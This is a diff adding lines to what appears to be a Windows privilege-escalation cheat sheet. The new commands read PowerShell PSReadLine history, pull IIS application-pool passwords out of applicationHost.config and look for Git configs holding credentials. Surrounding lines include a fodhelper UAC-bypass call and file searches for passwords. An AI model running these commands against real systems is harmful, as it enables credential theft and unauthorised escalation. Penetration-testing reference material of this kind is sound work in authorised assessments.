@@ -194,10 +194,21 @@ Start-Process "C:\Windows\System32\fodhelper.exe"
 findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config C:\*.bat 2>nul
 dir /s /b *pass* *cred* *.kdbx *.config 2>nul
 
+# PowerShell command history (PSReadLine — contains typed commands including plaintext creds)
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 # Web app configs
 type C:\inetpub\wwwroot\web.config
 type C:\xampp\htdocs\config.php
 
 # Bash history (WSL)
 type C:\Users\*\AppData\Local\Packages\*\LocalState\rootfs\root\.bash_history 2>nul
+
+# IIS application pool credentials (ApplicationHost.config)
+type C:\Windows\System32\inetsrv\config\applicationHost.config | findstr /i "password\|userName"
+
+# Git repositories (may have creds in history or config)
+dir /s /b *.git 2>nul
+# Check each found .git/config for credentials
 ```
